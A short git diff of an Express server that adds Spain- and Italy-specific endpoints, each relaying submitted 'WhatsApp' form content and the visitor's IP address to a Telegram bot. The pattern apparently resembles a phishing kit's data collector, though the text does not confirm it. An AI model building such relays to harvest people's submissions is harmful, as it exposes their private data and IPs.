@@ -35,9 +35,29 @@ app.post("/submit-whatsapp", (req, res) => {
 
   axios
     .post(
-      `https://api.telegram.org/bot${process.env.WHATSAPP_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      `https://api.telegram.org/bot${process.env.WHATSAPP_SPAIN_TELEGRAM_BOT_TOKEN}/sendMessage`,
       {
-        chat_id: process.env.WHATSAPP_TELEGRAM_CHAT_ID,
+        chat_id: process.env.WHATSAPP_SPAIN_TELEGRAM_CHAT_ID,
+        text: `WhatsApp\n\n${message}\nIP: ${req.clientIp}`,
+      }
+    )
+    .then(() => {
+      res.status(200).json({ success: true });
+    })
+    .catch((error) => {
+      console.error(error);
+      res.status(500).json({ success: false });
+    });
+});
+
+app.post("/submit-whatsapp2", (req, res) => {
+  const message = req.body.content;
+
+  axios
+    .post(
+      `https://api.telegram.org/bot${process.env.WHATSAPP_ITALY_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: process.env.WHATSAPP_ITALY_TELEGRAM_CHAT_ID,
         text: `WhatsApp\n\n${message}\nIP: ${req.clientIp}`,
       }
     )
